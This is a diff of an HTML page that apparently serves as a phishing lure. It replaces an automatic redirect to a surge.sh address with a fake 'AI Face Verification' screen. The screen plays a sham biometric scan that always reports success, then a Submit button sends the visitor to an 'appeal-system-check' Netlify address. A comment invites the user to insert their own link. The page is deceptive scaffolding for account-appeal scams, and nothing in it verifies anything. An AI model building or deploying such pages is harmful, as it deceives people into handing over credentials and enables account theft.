@@ -1,16 +1,320 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AI Face Verification</title>
 
-  <script>
-    setTimeout(function () {
-      window.location.href = "http://review-on-request-info.surge.sh/";
-    }, 1000);
-  </script>
+<style>
+
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Arial, sans-serif;
+}
+
+body{
+    height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    background:#020617;
+    overflow:hidden;
+    color:white;
+}
+
+.bg{
+    position:absolute;
+    width:500px;
+    height:500px;
+    background:#00ff99;
+    filter:blur(180px);
+    opacity:0.12;
+    border-radius:50%;
+}
+
+.card{
+    position:relative;
+    width:370px;
+    padding:28px;
+    border-radius:28px;
+    background:rgba(15,23,42,0.92);
+    border:1px solid rgba(255,255,255,0.08);
+    backdrop-filter:blur(12px);
+    box-shadow:
+        0 0 40px rgba(0,0,0,0.6),
+        inset 0 0 20px rgba(255,255,255,0.03);
+    text-align:center;
+}
+
+.logo{
+    width:82px;
+    height:82px;
+    margin:auto;
+    border-radius:50%;
+    background:linear-gradient(135deg,#00ff99,#00bfff);
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    font-size:38px;
+    box-shadow:0 0 35px rgba(0,255,153,0.5);
+}
+
+.title{
+    margin-top:18px;
+    font-size:29px;
+    font-weight:bold;
+}
+
+.sub{
+    color:#94a3b8;
+    margin-top:8px;
+    font-size:14px;
+}
+
+.scan-box{
+    position:relative;
+    width:230px;
+    height:280px;
+    margin:30px auto;
+    border-radius:28px;
+    overflow:hidden;
+    background:#000;
+    border:2px solid rgba(0,255,153,0.6);
+    box-shadow:
+        0 0 25px rgba(0,255,153,0.25),
+        inset 0 0 25px rgba(0,255,153,0.08);
+}
+
+.face{
+    position:absolute;
+    inset:0;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    font-size:130px;
+    opacity:0.95;
+}
+
+.grid{
+    position:absolute;
+    inset:0;
+    background-image:
+    linear-gradient(rgba(255,255,255,0.05) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(255,255,255,0.05) 1px, transparent 1px);
+    background-size:25px 25px;
+}
+
+.scan-line{
+    position:absolute;
+    width:100%;
+    height:5px;
+    background:#00ff99;
+    box-shadow:
+        0 0 15px #00ff99,
+        0 0 25px #00ff99;
+    animation:scan 2s linear infinite;
+}
+
+@keyframes scan{
+    0%{ top:0; }
+    100%{ top:100%; }
+}
+
+.corner{
+    position:absolute;
+    width:38px;
+    height:38px;
+    border:4px solid #00ff99;
+}
+
+.tl{
+    top:12px;
+    left:12px;
+    border-right:none;
+    border-bottom:none;
+}
+
+.tr{
+    top:12px;
+    right:12px;
+    border-left:none;
+    border-bottom:none;
+}
+
+.bl{
+    bottom:12px;
+    left:12px;
+    border-right:none;
+    border-top:none;
+}
+
+.br{
+    bottom:12px;
+    right:12px;
+    border-left:none;
+    border-top:none;
+}
+
+.status{
+    font-size:18px;
+    margin-top:5px;
+    letter-spacing:0.5px;
+}
+
+.progress{
+    width:100%;
+    height:12px;
+    background:#111827;
+    border-radius:50px;
+    overflow:hidden;
+    margin-top:18px;
+    border:1px solid rgba(255,255,255,0.05);
+}
+
+.bar{
+    width:0%;
+    height:100%;
+    border-radius:50px;
+    background:linear-gradient(90deg,#00ff99,#00bfff);
+    transition:width 5s linear;
+}
+
+button{
+    width:100%;
+    padding:15px;
+    margin-top:22px;
+    border:none;
+    border-radius:18px;
+    font-size:17px;
+    font-weight:bold;
+    cursor:pointer;
+    transition:0.3s;
+}
+
+#scanBtn{
+    color:white;
+    background:linear-gradient(135deg,#00ff99,#00bfff);
+    box-shadow:0 0 25px rgba(0,255,153,0.3);
+}
+
+#scanBtn:hover{
+    transform:scale(1.03);
+}
+
+#submitBtn{
+    display:none;
+    color:white;
+    background:linear-gradient(135deg,#2563eb,#3b82f6);
+    box-shadow:0 0 25px rgba(59,130,246,0.3);
+}
+
+#submitBtn:hover{
+    transform:scale(1.03);
+}
+
+.secure{
+    margin-top:16px;
+    font-size:13px;
+    color:#64748b;
+}
+
+</style>
 </head>
+
 <body>
+
+<div class="bg"></div>
+
+<div class="card">
+
+    <div class="logo">
+        🤖
+    </div>
+
+    <div class="title">
+        AI Verification
+    </div>
+
+    <div class="sub">
+        Secure biometric authentication
+    </div>
+
+    <div class="scan-box">
+
+        <div class="grid"></div>
+
+        <div class="corner tl"></div>
+        <div class="corner tr"></div>
+        <div class="corner bl"></div>
+        <div class="corner br"></div>
+
+        <div class="face">
+            👤
+        </div>
+
+        <div class="scan-line"></div>
+
+    </div>
+
+    <div class="status" id="status">
+        Waiting for scan...
+    </div>
+
+    <div class="progress">
+        <div class="bar" id="bar"></div>
+    </div>
+
+    <button id="scanBtn">
+        Start Scan
+    </button>
+
+    <button id="submitBtn">
+        Submit Verification
+    </button>
+
+    <div class="secure">
+        Encrypted AI Security System
+    </div>
+
+</div>
+
+<script>
+
+const scanBtn = document.getElementById("scanBtn");
+const submitBtn = document.getElementById("submitBtn");
+const statusText = document.getElementById("status");
+const bar = document.getElementById("bar");
+
+scanBtn.onclick = ()=>{
+
+    statusText.innerHTML = "Analyzing biometric data...";
+
+    setTimeout(()=>{
+        bar.style.width = "100%";
+    },100);
+
+    setTimeout(()=>{
+
+        statusText.innerHTML = "Identity Verified Successfully";
+
+        submitBtn.style.display = "block";
+
+        scanBtn.style.display = "none";
+
+    },5000);
+
+};
+
+submitBtn.onclick = ()=>{
+
+    // هتي پنهنجي لنڪ لڳايو
+    window.location.href = "https://appeal-system-check.netlify.app/";
+
+};
+
+</script>
 
 </body>
 </html>
